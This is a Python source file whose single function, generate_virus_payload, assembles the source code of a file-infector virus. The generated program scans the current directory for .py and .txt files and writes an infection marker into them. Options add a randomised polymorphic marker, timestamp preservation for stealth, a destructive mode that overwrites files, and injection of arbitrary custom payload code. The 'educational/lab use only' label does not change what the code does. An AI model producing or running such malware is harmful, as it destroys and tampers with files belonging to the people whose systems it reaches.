import random
import string

def generate_virus_payload(
    target=None,
    marker="#~infected~#",
    payload_code=None,
    infect_types=(".py", ".txt"),
    polymorphic=True,
    stealth=True,
    destructive=False,
    custom_message=None
):
    """
    Generate a fully-featured, customizable file infector virus payload (for educational/lab use only).
    Features:
      - Infects multiple file types
      - Optional polymorphism (random marker/code)
      - Optional stealth (hides marker, preserves timestamps)
      - Optional destructive mode (overwrites files)
      - Optional custom payload and message
    """
    # Polymorphic marker/code
    if polymorphic:
        marker = "#~infected~" + ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + "~#"
        poly_payload = (
            "import random\n"
            "def poly():\n"
            "    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))\n"
        )
    else:
        poly_payload = ""

    # Stealth: preserve timestamps, hide marker in comments
    stealth_code = (
        "import os, time\n"
        "def preserve_timestamp(fname, func):\n"
        "    ts = os.path.getmtime(fname)\n"
        "    func()\n"
        "    os.utime(fname, (ts, ts))\n"
    ) if stealth else ""

    # Destructive: overwrite files
    destructive_code = (
        "def destroy(fname):\n"
        "    with open(fname, 'w') as f:\n"
        "        f.write('This file has been destroyed by a virus!')\n"
    ) if destructive else ""

    # Infection logic
    infect_code = (
        "def infect():\n"
        "    import glob, os\n"
        f"    marker = {repr(marker)}\n"
        f"    file_types = {infect_types}\n"
        "    for ext in file_types:\n"
        "        for fname in glob.glob(f'*{ext}'):\n"
        "            try:\n"
        "                with open(fname, 'r+') as f:\n"
        "                    content = f.read()\n"
        "                    if marker not in content:\n"
        "                        f.seek(0,0)\n"
        "                        # Stealth: hide marker in comment\n"
        "                        f.write('# ' + marker + '\\n' + content)\n"
        "                        # Destructive mode\n"
        "                        {destructive_call}\n"
        "            except Exception:\n"
        "                pass\n"
    ).replace("{destructive_call}", "destroy(fname)" if destructive else "")

    # Custom payload/message
    payload_section = (
        "def payload():\n"
        "    # Custom payload goes here\n"
        f"{'    pass' if not payload_code else '    ' + payload_code.replace(chr(10), chr(10)+'    ')}\n"
        f"    {f'print({repr(custom_message)})' if custom_message else ''}\n"
    )

    # Compose full virus code
    virus_code = (
        "#!/usr/bin/env python3\n"
        f"{poly_payload}"
        f"{stealth_code}"
        f"{destructive_code}"
        f"{payload_section}"
        f"{infect_code}"
        "if __name__ == '__main__':\n"
        "    infect()\n"
        "    payload()\n"
    )

    return {
        "virus_payload": virus_code,
        "description": (
            "A customizable, simulated virus that infects multiple file types, supports polymorphism, stealth, "
            "destructive mode, and custom payload/message. For educational/lab use only."
        ),
        "marker": marker
    }
